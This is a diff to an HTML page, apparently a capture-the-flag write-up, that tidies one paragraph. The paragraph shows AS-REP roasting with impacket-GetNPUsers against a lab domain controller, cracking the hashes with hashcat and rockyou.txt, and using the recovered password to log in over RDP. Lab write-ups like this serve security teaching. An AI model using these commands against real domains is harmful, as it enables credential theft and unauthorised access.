@@ -214,7 +214,7 @@ Final times for host: srtt: 103143 rttvar: 2898  to: 114735
 
 <p><img src="/assets/img/aoc2025/hoppers-origins/as-rep_roastable_ai.png" alt="enter image description here" /></p>
 
-<p>Exporting the users to a file, we can run <code class="language-plaintext highlighter-rouge">impacket-GetNPUsers ai.vanchat.loc/anne.clark@10.200.171.122 -dc-ip 10.200.171.122 -usersfile as-rep-users &gt; as-rep.hashes</code> gats a list of hashes which we can then crack with ` hashcat -m 18200 as-rep.hashes /usr/share/wordlists/seclists/Passwords/rockyou.txt` which reveals a password for qw2.amy.young, “password1!”. Now we can sign in to Server1 with RDP and grab the server1 user flag!</p>
+<p>Exporting the users to a file, we can run <code class="language-plaintext highlighter-rouge">impacket-GetNPUsers ai.vanchat.loc/anne.clark@10.200.171.122 -dc-ip 10.200.171.122 -usersfile as-rep-users &gt; as-rep.hashes</code>, which gets a list of hashes which we can then crack with <code class="language-plaintext highlighter-rouge">hashcat -m 18200 as-rep.hashes /usr/share/wordlists/seclists/Passwords/rockyou.txt</code> which reveals a password for qw2.amy.young, “password1!”. Now we can sign in to Server1 with RDP and grab the server1 user flag!</p>
 
 <p><img src="/assets/img/aoc2025/hoppers-origins/server1_rdp.png" alt="enter image description here" /></p>
 
